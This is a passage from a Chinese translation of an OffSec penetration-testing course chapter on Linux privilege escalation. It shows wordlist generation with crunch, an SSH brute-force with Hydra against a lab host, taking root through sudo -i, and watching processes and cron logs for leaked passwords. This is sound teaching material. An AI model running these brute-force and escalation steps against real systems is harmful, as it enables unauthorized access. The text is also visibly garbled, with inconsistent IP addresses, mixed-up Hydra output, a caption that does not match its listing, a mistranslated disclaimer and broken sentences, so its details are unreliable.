

# OffSec

我们已经成功获得了 root 权限，现在让我们尝试另一种基于环境变量发现的权限提升路径。

我们不必直接目标是 root 账户，而是可以尝试获取在之前的章节中发现的 eve 用户的访问。

根据我们对脚本凭据的了解，我们可以根据已知密码构建一个自定义字典，以尝试对 eve 的账户进行暴力破解。

我们可以使用 `crunch` 命令行工具来生成自定义的字典列表。我们将最小和最大长度都设置为 6 个字符，使用 `t` 参数指定模式，然后将前三个字符硬编码为 `Lab`，后面跟三个数字。

```
kali@kali~$ crunch 6 6 -t Lab%%% - wordlist
```

> 列表 482 - 为暴力破解攻击生成字典列表

然后我们可以验证生成的字典列表的内容：

```
kali@kali~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009

```

> 列表 483 - 检查字典列表内容

由于目标机器上有一个 SSH 服务器，我们可以尝试通过 Hydra 尝试远程暴力攻击。我们将使用 `-u` 参数提供目标用户名，使用 `-P` 提供我们的字典列表、目标 IP 地址，最后指定 `ssh` 为目标协议。我们还会包含 `-V` 来增加详细输出。

```
kali@kali~$ hydra -l eve -P wordlist 192.168.0.214 -t 4 ssh -v
Hydra v9.3 (c) 2022 by Vanhauser & David Maciejak - 请勿用于军事或秘密服务机构，或用于非法目的（这是没有约束力的，这些***完全无视法律和道德***）。
```

```
Hydra (https://github.com/vanhauser-thc/hydra) starting at 2022-08-23 13:40:44
[DATA] 4 tasks per server, 4 tasks, 1000 login tries (l:1/p:1000), -250 tries per task
[ATTACK] ssh://192.168.0.214:22/
[ATTEMPT] target 192.168.0.214 - login "Lab000" - 1 of 1000 [child 0]
(0/0)
[ATTEMPT] target 192.168.0.214 - login "Lab001" - 2 of 1000 [child 1]
(0/0)
[ATTEMPT] target 192.168.0.214 - login "eve" - 3 of 1000 [child 2]
(0/0)
[ATTEMPT] target 192.168.0.214 - login "Lab003" - 4 of 1000 [child 3]
(0/0)
[ATTEMPT] target 192.168.0.214 - login "Lab004" - 5 of 1000 [child 2]
(0/0)
```

[ATTEMPT] target 192.168.50.214 - login eve pass "Lab120" 121 of 1000 [child 0]
(0/0)
[ATTEMPT] target 192.168.50.214 - login eve pass "Lab121" 122 of 1000 [child 3]
(0/0)
[ATTEMPT] target 192.168.50.214 - login eve pass "Lab122" 123 of 1000 [child 2]
(0/0)
[ATTEMPT] target 192.168.50.214 - login eve pass "Lab123" 124 of 1000 [child 1]
(0/0)
[[ssh] host: 192.168.50.214 login: eve password:Lab123
1 of 1 successfully completed, valid password found

列表 484 - 成功暴力破解 eve 的密码

我们的暴力破解攻击成功了，现在可以使用 eve 的凭据通过 SSH 登录目标机器：

```
kali@kali:~$ ssh eve@192.168.50.214
eve@192.168.50.214:password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:-$ sudo
```

列表 485 - 成功以 eve 身份登录

一旦登录 eve，我们可以通过使用 sudo 命令提升 sudo 权限来验证我们是否以特权用户身份运行。

```
eve@debian-privesc:-$ sudo -l
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
en_result, mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

User eve 可以在 debian-privesc 上运行以下命令：
(ALL : ALL) ALL

列表 486 - 检查 sudo 权限

由于 eve 似乎是一个管理账户，我们可以以高权限用户的身份运行任何命令。这意味着我们可以通过运行 `sudo -i` 并提供 eve 的凭据直接获取 root。

```
eve@debian-privesc:-$ sudo -i
[sudo] password for eve:
root@debian-privesc:/home/eve# whoami
root
```

列表 487 - 提升到 root

太棒了！我们成功通过另一种途径提升了权限并获得了管理访问权限。在下一个章节中，我们将学习如何通过收集系统服务凭据来提升权限。

# 检查足迹

## 17.2.2

daemons856 在启动时创建的 Linux 服务，用于执行特定操作而无需任何用户交互。Linux 服务器通常被配置为托管大量的守护进程、SSH、Web 服务器和数据库等（仅举不举）。

系统管理员经常依赖自定义守护进程来执行临时任务，并且有时会忽视安全最佳实践。

作为我们枚举工作的一部分，我们应该检查运行进程的行为，以寻找可能导致权限提升的异常情况。

与 Windows 系统不同，在 Linux 上我们可以列出关于在 root 用户范围内运行的高特权进程的信息。

我们可以使用 `ps` 命令枚举所有运行的进程，由于它只获取活动进程的快照，我们可以通过 `watch` 命令刷新它。在下面的示例中，我们将通过 `watch` 工具每秒运行一次 `ps` 命令，并过滤结果以查找任何出现“pass” 单词的时刻。

```
joe@privvesc:~$ watch -n 1 "ps -aux | grep pass"
joe 16687 0.0 0.1 6352 2996 S+ 05:41 0:0
root 16880 0.0 0.1 6352 2996 S+ 05:41 0:0
```

> 列表 488 - 收集活动进程

为了利用文件权限，我们必须找到一个无法写入但以高权限运行的可执行文件。在 Linux 系统中，基于时间的作业调度器是一个极佳目标，因为系统级调度作业是以 root 权限执行的。

在这个示例中，我们将使用 SSH 登录 joe 用户，使用 `offsec` 作为密码。在之前的章节中，我们演示了如何在文件系统中检查已安装的 cron 作。我们还会检查 cron 文件（/var/log/cron.log）以查看运行中的 cron 作：

```
joe@debian:~$ grep "CRON" /var/log/cron.log
Aug 25 04:56:07 debian-privsec cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privsec cron[463]: (CRON) INFO (Running (reboot jobs)
Aug 25 04:57:01 debian-privsec cron[918]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

> 列表 489 - 使用 tcpdump 进行嗅探

几秒后提示提示 root 的凭据。不错！

这两个示例为寻找泄露的凭据提供了切入点。在涵盖了显而易得的果实后，接下来将探索如何通过配置错误的权限提升权限。

# 17. 不安全的权限

本学习单元涵盖以下学习目标：

- 滥用 cron 作提升权限
- 滥用权限提升权限

在本学习单元中，我们将检查配置错误的权限可能导致哪些提升路径。

## 17.3. 滥用 cron 作

让我们关注另一类权限提升技术并学习如何利用文件权限。在本节中，我们假设已经以非特权用户身份访问了目标机器。

